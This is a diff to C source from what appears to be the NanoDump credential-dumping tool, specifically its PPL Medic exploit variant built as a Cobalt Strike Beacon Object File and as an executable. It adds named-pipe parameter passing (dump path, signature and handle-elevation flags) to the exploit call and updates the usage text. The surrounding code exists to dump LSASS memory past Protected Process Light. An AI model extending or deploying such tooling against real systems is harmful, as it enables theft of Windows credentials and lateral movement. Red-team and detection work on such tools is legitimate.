@@ -141,19 +141,38 @@ int main(int argc, char* argv[])
 #include "../syscalls.c"
 #include "../token_priv.c"
 #include "../impersonate.c"
+#if PASS_PARAMS_VIA_NAMED_PIPES == 1
+#include "../pipe.c"
+#endif
 
 void go(char* args, int length)
 {
     datap          parser                     = { 0 };
     unsigned char* nanodump_ppl_medic_dll     = NULL;
     int            nanodump_ppl_medic_dll_len = 0;
+    LPSTR          dump_path                  = NULL;
+    BOOL           use_valid_sig              = FALSE;
+    BOOL           elevate_handle             = FALSE;
 
     BeaconDataParse(&parser, args, length);
     nanodump_ppl_medic_dll = (unsigned char*)BeaconDataExtract(&parser, &nanodump_ppl_medic_dll_len);
 
+#if PASS_PARAMS_VIA_NAMED_PIPES == 1
+    /*
+     * only parse parameters if PASS_PARAMS_VIA_NAMED_PIPES is enabled
+     * if not, the hardcoded options in NanoDumpPPLMedic will be used
+     */
+    dump_path = BeaconDataExtract(&parser, NULL);
+    use_valid_sig = (BOOL)BeaconDataInt(&parser);
+    elevate_handle = (BOOL)BeaconDataInt(&parser);
+#endif
+
     run_ppl_medic_exploit(
         nanodump_ppl_medic_dll,
-        nanodump_ppl_medic_dll_len);
+        nanodump_ppl_medic_dll_len,
+        dump_path,
+        use_valid_sig,
+        elevate_handle);
 }
 
 #elif defined(PPL_MEDIC) && defined(EXE)
@@ -186,7 +205,7 @@ int main(int argc, char* argv[])
 
 void usage(char* procname)
 {
-    PRINT("usage: %s --write C:\\Windows\\Temp\\doc.docx [--valid] [--duplicate] [--help]", procname);
+    PRINT("usage: %s --write C:\\Windows\\Temp\\doc.docx [--valid] [--elevate-handle] [--help]", procname);
     PRINT("Dumpfile options:");
     PRINT("    --write DUMP_PATH, -w DUMP_PATH");
     PRINT("            filename of the dump");
@@ -202,9 +221,9 @@ void usage(char* procname)
 
 int main(int argc, char* argv[])
 {
-    BOOL   elevate_handle    = FALSE;
     LPSTR  dump_path         = NULL;
     BOOL   use_valid_sig     = FALSE;
+    BOOL   elevate_handle    = FALSE;
 
     for (int i = 1; i < argc; ++i)
     {
